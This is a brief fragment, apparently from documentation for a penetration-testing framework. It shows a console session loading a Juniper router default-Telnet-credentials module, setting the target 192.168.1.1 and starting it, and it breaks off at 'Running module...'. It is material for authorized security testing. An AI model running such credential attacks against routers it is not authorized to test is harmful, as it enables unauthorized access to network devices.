...
```
exf > use creds/routers/juniper/telnet_default_creds
exf (Juniper Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Juniper Router Default Telnet Creds) > run
[*] Running module...
